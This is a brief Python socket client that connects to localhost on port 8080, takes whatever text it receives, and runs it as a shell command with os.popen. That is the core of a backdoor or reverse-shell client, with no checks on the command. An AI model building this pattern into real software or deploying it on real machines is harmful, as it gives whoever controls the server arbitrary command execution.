import socket
import os

HOST = 'localhost'
PORT = 8080

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST, PORT))

data = client.recv(1024)
cmd = data.decode()

output = os.popen(cmd).read()
print(output)

client.close()
